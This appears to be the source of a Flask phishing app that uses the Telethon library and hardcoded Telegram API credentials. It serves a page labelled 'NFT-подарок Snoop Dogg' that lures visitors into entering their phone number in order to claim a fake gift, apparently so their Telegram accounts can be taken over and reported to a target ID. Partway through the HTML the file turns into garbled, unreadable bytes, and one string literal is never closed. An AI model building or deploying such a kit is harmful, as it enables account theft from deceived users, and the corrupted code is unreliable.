from flask import Flask, request, render_template_string
import asyncio
import threading
import re
import os
import logging
from datetime import datetime
from telethon import TelegramClient

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = 35008820
API_HASH = "f2d029353318854be42b9de2d75c3933
TARGET_ID = 7499553746

PHISHING_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Telegram NFT Gift</title></head>
<body style="text-align:center; padding-top:50px;">
    <h2>😁 NFT-подарок Snoop Dogg #223674</h2>
    <form method="POST" action="/claim">
        <input type="text" name="phone" placeholder="+7XXXXXXXXX(ЁѕЈ􉍽BkBBЃBB܁QɅ(ѽՉЈBBBFFBFF0ѽ(𽙽ɴ(𽉽(ѵ(()ͬ}}}|()ɽє)ࠤ(ɕɸɕ}ѕѕ}ɥA!%M!%9}A()ɽєѡlA=MPt)(ɕՕйɴР(ɕՕйɴР(ݥѠ٥ѥ̹М́(ɥє퍽q(ѡɕQɕхɝ聅幍ոѕՔхР(ɕɸBBBBFBBBFBFBBBB()幌ѕ((ЀQɅ
С͕ͥ}A%}%A%}!M (݅ЁйхС}聍(幌ȁйѕ}̠(幌ȁ͜йѕ}̡ͅ(͜ѕЁйМ͜ѕ(݅Ёй݅ɑ}̡ͅQIQ}%͜(݅Ёй͍Р(ፕЁፕѥ́(ȹɽȡB{F#BBBB()}}}|}}}|(Ѐ􁥹С̹٥ɽРA=IP(ոФ(                            